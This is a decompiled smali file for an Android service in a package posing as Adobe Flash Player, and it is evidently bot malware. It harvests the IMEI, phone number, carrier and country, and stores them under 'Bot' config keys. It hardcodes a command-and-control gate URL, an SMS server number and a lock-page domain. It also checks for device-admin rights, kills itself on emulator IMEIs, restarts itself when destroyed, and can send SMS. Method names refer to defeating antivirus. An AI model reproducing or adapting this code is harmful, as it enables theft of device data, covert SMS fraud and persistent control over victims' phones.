.class public Lcom/adobe/flashplayer_/DDD;
.super Landroid/app/Service;
.source "DDD.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 43
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method private AvFuck()Ljava/lang/String;
    .locals 2

    .prologue
    .line 163
    invoke-virtual {p0}, Lcom/adobe/flashplayer_/DDD;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "android_id"

    invoke-static {v0, v1}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method private readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;
    .locals 7
    .param p1, "config"    # Ljava/lang/String;
    .param p2, "context"    # Landroid/content/Context;

    .prologue
    .line 230
    const-string v4, "!"

    .line 233
    .local v4, "ret":Ljava/lang/String;
    :try_start_0
    invoke-virtual {p2, p1}, Landroid/content/Context;->openFileInput(Ljava/lang/String;)Ljava/io/FileInputStream;

    move-result-object v1

    .line 235
    .local v1, "inputStream":Ljava/io/InputStream;
    if-eqz v1, :cond_0

    .line 236
    new-instance v2, Ljava/io/InputStreamReader;

    invoke-direct {v2, v1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    .line 237
    .local v2, "inputStreamReader":Ljava/io/InputStreamReader;
    new-instance v0, Ljava/io/BufferedReader;

    invoke-direct {v0, v2}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 238
    .local v0, "bufferedReader":Ljava/io/BufferedReader;
    const-string v3, ""

    .line 239
    .local v3, "receiveString":Ljava/lang/String;
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    .line 241
    .local v5, "stringBuilder":Ljava/lang/StringBuilder;
    :goto_0
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v3

    if-nez v3, :cond_1

    .line 245
    invoke-virtual {v1}, Ljava/io/InputStream;->close()V

    .line 246
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    .line 253
    .end local v0    # "bufferedReader":Ljava/io/BufferedReader;
    .end local v1    # "inputStream":Ljava/io/InputStream;
    .end local v2    # "inputStreamReader":Ljava/io/InputStreamReader;
    .end local v3    # "receiveString":Ljava/lang/String;
    .end local v5    # "stringBuilder":Ljava/lang/StringBuilder;
    :cond_0
    :goto_1
    return-object v4

    .line 242
    .restart local v0    # "bufferedReader":Ljava/io/BufferedReader;
    .restart local v1    # "inputStream":Ljava/io/InputStream;
    .restart local v2    # "inputStreamReader":Ljava/io/InputStreamReader;
    .restart local v3    # "receiveString":Ljava/lang/String;
    .restart local v5    # "stringBuilder":Ljava/lang/StringBuilder;
    :cond_1
    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1

    goto :goto_0

    .line 249
    .end local v0    # "bufferedReader":Ljava/io/BufferedReader;
    .end local v1    # "inputStream":Ljava/io/InputStream;
    .end local v2    # "inputStreamReader":Ljava/io/InputStreamReader;
    .end local v3    # "receiveString":Ljava/lang/String;
    .end local v5    # "stringBuilder":Ljava/lang/StringBuilder;
    :catch_0
    move-exception v6

    goto :goto_1

    .line 250
    :catch_1
    move-exception v6

    goto :goto_1
.end method

.method private writeZConfig(Ljava/lang/String;Ljava/lang/String;)V
    .locals 2
    .param p1, "config"    # Ljava/lang/String;
    .param p2, "data"    # Ljava/lang/String;

    .prologue
    .line 220
    :try_start_0
    new-instance v0, Ljava/io/OutputStreamWriter;

    const/4 v1, 0x0

    invoke-virtual {p0, p1, v1}, Lcom/adobe/flashplayer_/DDD;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;)V

    .line 221
    .local v0, "outputStreamWriter":Ljava/io/OutputStreamWriter;
    invoke-virtual {v0, p2}, Ljava/io/OutputStreamWriter;->write(Ljava/lang/String;)V

    .line 222
    invoke-virtual {v0}, Ljava/io/OutputStreamWriter;->close()V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 226
    .end local v0    # "outputStreamWriter":Ljava/io/OutputStreamWriter;
    :goto_0
    return-void

    .line 224
    :catch_0
    move-exception v1

    goto :goto_0
.end method


# virtual methods
.method public checkA()V
    .locals 6

    .prologue
    .line 185
    new-instance v1, Landroid/content/ComponentName;

    const-class v4, Lcom/adobe/flashplayer_/FFF;

    invoke-direct {v1, p0, v4}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 187
    .local v1, "mAdminName":Landroid/content/ComponentName;
    const-string v4, "device_policy"

    invoke-virtual {p0, v4}, Lcom/adobe/flashplayer_/DDD;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/app/admin/DevicePolicyManager;

    .line 189
    .local v2, "mDPM":Landroid/app/admin/DevicePolicyManager;
    invoke-virtual {v2, v1}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v0

    .line 191
    .local v0, "active":Z
    const-string v4, "fuckavs"

    invoke-virtual {p0}, Lcom/adobe/flashplayer_/DDD;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    invoke-direct {p0, v4, v5}, Lcom/adobe/flashplayer_/DDD;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v3

    .line 193
    .local v3, "na":Ljava/lang/String;
    if-eqz v0, :cond_0

    .line 195
    new-instance v4, Landroid/content/Intent;

    const-class v5, Lcom/adobe/flashplayer_/AZC;

    invoke-direct {v4, p0, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v4}, Lcom/adobe/flashplayer_/DDD;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 199
    :cond_0
    return-void
.end method

.method public decrypt(Ljava/lang/String;I)Ljava/lang/String;
    .locals 9
    .param p1, "s"    # Ljava/lang/String;
    .param p2, "offset"    # I

    .prologue
    .line 203
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v7

    div-int v3, v7, p2

    .local v3, "l":I
    const/4 v1, 0x0

    .line 204
    .local v1, "c":I
    move v2, p2

    .local v2, "i":I
    const/4 v6, 0x0

    .line 205
    .local v6, "z":I
    const-string v4, ""

    .local v4, "ret":Ljava/lang/String;
    const-string v0, ""

    .line 206
    .local v0, "block":Ljava/lang/String;
    const/4 v5, 0x0

    .local v5, "x":I
    :goto_0
    if-lt v5, v3, :cond_0

    .line 210
    return-object v0

    .line 207
    :cond_0
    add-int/lit8 v1, v1, 0x10

    add-int/lit8 v6, v1, -0x1

    .line 208
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1, v6, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 206
    add-int/lit8 v5, v5, 0x1

    goto :goto_0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 177
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 30

    .prologue
    .line 47
    invoke-super/range {p0 .. p0}, Landroid/app/Service;->onCreate()V

    .line 50
    const-string v2, "phone"

    move-object/from16 v0, p0

    invoke-virtual {v0, v2}, Lcom/adobe/flashplayer_/DDD;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v27

    check-cast v27, Landroid/telephony/TelephonyManager;

    .line 51
    .local v27, "telephonyManager":Landroid/telephony/TelephonyManager;
    const-string v2, "phone"

    move-object/from16 v0, p0

    invoke-virtual {v0, v2}, Lcom/adobe/flashplayer_/DDD;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v26

    check-cast v26, Landroid/telephony/TelephonyManager;

    .line 53
    .local v26, "tMgr":Landroid/telephony/TelephonyManager;
    invoke-virtual/range {v26 .. v26}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v25

    .line 54
    .local v25, "pn":Ljava/lang/String;
    invoke-virtual/range {v27 .. v27}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v8

    .line 55
    .local v8, "BotID":Ljava/lang/String;
    invoke-virtual/range {v27 .. v27}, Landroid/telephony/TelephonyManager;->getNetworkOperatorName()Ljava/lang/String;

    move-result-object v10

    .line 56
    .local v10, "BotNetwork":Ljava/lang/String;
    invoke-virtual/range {v27 .. v27}, Landroid/telephony/TelephonyManager;->getSimCountryIso()Ljava/lang/String;

    move-result-object v9

    .line 57
    .local v9, "BotLocation":Ljava/lang/String;
    sget-object v21, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    .line 61
    .local v21, "SDK":Ljava/lang/String;
    const-string v2, "000000000000000"

    invoke-virtual {v8, v2}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v2

    const/4 v3, -0x1

    if-eq v2, v3, :cond_0

    const/4 v2, 0x0

    invoke-static {v2}, Ljava/lang/System;->exit(I)V

    .line 64
    :cond_0
    const-string v12, "france"

    .line 66
    .local v12, "BotnetPrefix":Ljava/lang/String;
    const-string v20, "http://google.com/"

    .line 68
    .local v20, "Promo":Ljava/lang/String;
    const-string v19, "79019030857"

    .line 70
    .local v19, "MacrosData":Ljava/lang/String;
    const-string v13, "79019030857"

    .line 72
    .local v13, "DSmsServer":Ljava/lang/String;
    const-string v24, "79019030857"

    .line 74
    .local v24, "pm_setts":Ljava/lang/String;
    const-string v14, "http://188.227.179.10/onlyfud/gate.php"

    .line 76
    .local v14, "HttpServer":Ljava/lang/String;
    const-string v17, "http://kk9.biz"

    .line 78
    .local v17, "LockLending":Ljava/lang/String;
    const-string v11, "6.0cs"

    .line 80
    .local v11, "BotVer":Ljava/lang/String;
    const-string v23, "zkazka"

    .line 82
    .local v23, "keyCode":Ljava/lang/String;
    const/16 v15, 0xa

    .line 84
    .local v15, "Knock":I
    const-string v2, "Reich_ServerGate"

    invoke-virtual/range {p0 .. p0}, Lcom/adobe/flashplayer_/DDD;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    move-object/from16 v0, p0

    invoke-direct {v0, v2, v3}, Lcom/adobe/flashplayer_/DDD;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v22

    .line 86
    .local v22, "SGate":Ljava/lang/String;
    const-string v2, "Reich_SMSGate"

    invoke-virtual/range {p0 .. p0}, Lcom/adobe/flashplayer_/DDD;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    move-object/from16 v0, p0

    invoke-direct {v0, v2, v3}, Lcom/adobe/flashplayer_/DDD;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v18

    .line 88
    .local v18, "MGate":Ljava/lang/String;
    const-string v2, "lending"

    invoke-virtual/range {p0 .. p0}, Lcom/adobe/flashplayer_/DDD;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    move-object/from16 v0, p0

    invoke-direct {v0, v2, v3}, Lcom/adobe/flashplayer_/DDD;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v16

    .line 90
    .local v16, "LLending":Ljava/lang/String;
    mul-int/lit16 v0, v15, 0x3e8

    move/from16 v28, v0

    .line 92
    .local v28, "tmp_1":I
    add-int/lit8 v29, v28, 0x1

    .line 98
    .local v29, "tmp_2":I
    if-nez v8, :cond_1

    .line 99
    invoke-direct/range {p0 .. p0}, Lcom/adobe/flashplayer_/DDD;->AvFuck()Ljava/lang/String;

    move-result-object v8

    .line 102
    :cond_1
    if-nez v10, :cond_2

    const-string v10, "Android"

    .line 104
    :cond_2
    if-nez v9, :cond_3

    const-string v9, "Unknown"

    .line 106
    :cond_3
    if-nez v25, :cond_7

    const-string v25, ""

    .line 109
    :goto_0
    const-string v2, "!"

    move-object/from16 v0, v22

    invoke-virtual {v0, v2}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v2

    const/4 v3, -0x1

    if-eq v2, v3, :cond_4

    .line 110
    const-string v2, "Reich_ServerGate"

    move-object/from16 v0, p0

    invoke-direct {v0, v2, v14}, Lcom/adobe/flashplayer_/DDD;->writeZConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 113
    :cond_4
    const-string v2, "!"

    move-object/from16 v0, v18

    invoke-virtual {v0, v2}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v2

    const/4 v3, -0x1

    if-eq v2, v3, :cond_5

    .line 114
    const-string v2, "Reich_SMSGate"

    move-object/from16 v0, p0

    invoke-direct {v0, v2, v13}, Lcom/adobe/flashplayer_/DDD;->writeZConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 117
    :cond_5
    const-string v2, "!"

    move-object/from16 v0, v16

    invoke-virtual {v0, v2}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v2

    const/4 v3, -0x1

    if-eq v2, v3, :cond_6

    .line 118
    const-string v2, "lending"

    move-object/from16 v0, p0

    move-object/from16 v1, v17

    invoke-direct {v0, v2, v1}, Lcom/adobe/flashplayer_/DDD;->writeZConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 123
    :cond_6
    const-string v2, "BotID"

    move-object/from16 v0, p0

    invoke-direct {v0, v2, v8}, Lcom/adobe/flashplayer_/DDD;->writeZConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 124
    const-string v2, "BotNetwork"

    const-string v3, " "

    const-string v4, "_"

    invoke-virtual {v10, v3, v4}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    move-object/from16 v0, p0

    invoke-direct {v0, v2, v3}, Lcom/adobe/flashplayer_/DDD;->writeZConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 125
    const-string v2, "BotLocation"

    move-object/from16 v0, p0

    invoke-direct {v0, v2, v9}, Lcom/adobe/flashplayer_/DDD;->writeZConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 126
    const-string v2, "BotVer"

    move-object/from16 v0, p0

    invoke-direct {v0, v2, v11}, Lcom/adobe/flashplayer_/DDD;->writeZConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 127
    const-string v2, "BotPhone"

    move-object/from16 v0, p0

    move-object/from16 v1, v25

    invoke-direct {v0, v2, v1}, Lcom/adobe/flashplayer_/DDD;->writeZConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 128
    const-string v2, "BotPrefix"

    move-object/from16 v0, p0

    invoke-direct {v0, v2, v12}, Lcom/adobe/flashplayer_/DDD;->writeZConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 129
    const-string v2, "MacrosData"

    move-object/from16 v0, p0

    move-object/from16 v1, v19

    invoke-direct {v0, v2, v1}, Lcom/adobe/flashplayer_/DDD;->writeZConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 130
    const-string v2, "pm_setts"

    move-object/from16 v0, p0

    move-object/from16 v1, v24

    invoke-direct {v0, v2, v1}, Lcom/adobe/flashplayer_/DDD;->writeZConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 131
    const-string v2, "MacrosAState"

    const-string v3, "A"

    move-object/from16 v0, p0

    invoke-direct {v0, v2, v3}, Lcom/adobe/flashplayer_/DDD;->writeZConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 132
    const-string v2, "w"

    const-string v3, "*"

    move-object/from16 v0, p0

    invoke-direct {v0, v2, v3}, Lcom/adobe/flashplayer_/DDD;->writeZConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 133
    const-string v2, "keyCode"

    move-object/from16 v0, p0

    move-object/from16 v1, v23

    invoke-direct {v0, v2, v1}, Lcom/adobe/flashplayer_/DDD;->writeZConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 137
    new-instance v2, Lcom/adobe/flashplayer_/DDD$1;

    move/from16 v0, v29

    int-to-long v4, v0

    move/from16 v0, v28

    int-to-long v6, v0

    move-object/from16 v3, p0

    invoke-direct/range {v2 .. v7}, Lcom/adobe/flashplayer_/DDD$1;-><init>(Lcom/adobe/flashplayer_/DDD;JJ)V

    .line 153
    invoke-virtual {v2}, Lcom/adobe/flashplayer_/DDD$1;->start()Landroid/os/CountDownTimer;

    .line 158
    return-void

    .line 106
    :cond_7
    const-string v2, "+"

    const-string v3, ""

    move-object/from16 v0, v25

    invoke-virtual {v0, v2, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v25

    goto/16 :goto_0
.end method

.method public onDestroy()V
    .locals 2

    .prologue
    .line 215
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/adobe/flashplayer_/DDD;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lcom/adobe/flashplayer_/DDD;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 216
    return-void
.end method

.method public sendSMS(Ljava/lang/String;Ljava/lang/String;)V
    .locals 7
    .param p1, "n"    # Ljava/lang/String;
    .param p2, "msg"    # Ljava/lang/String;

    .prologue
    const/4 v2, 0x0

    .line 168
    move-object v1, p1

    .line 169
    .local v1, "phoneNumber":Ljava/lang/String;
    move-object v6, p2

    .line 170
    .local v6, "message":Ljava/lang/String;
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .line 171
    .local v0, "smsManager":Landroid/telephony/SmsManager;
    invoke-virtual {v0, v6}, Landroid/telephony/SmsManager;->divideMessage(Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object v3

    .local v3, "parts":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    move-object v4, v2

    move-object v5, v2

    .line 172
    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendMultipartTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/util/ArrayList;Ljava/util/ArrayList;Ljava/util/ArrayList;)V

    .line 173
    return-void
.end method
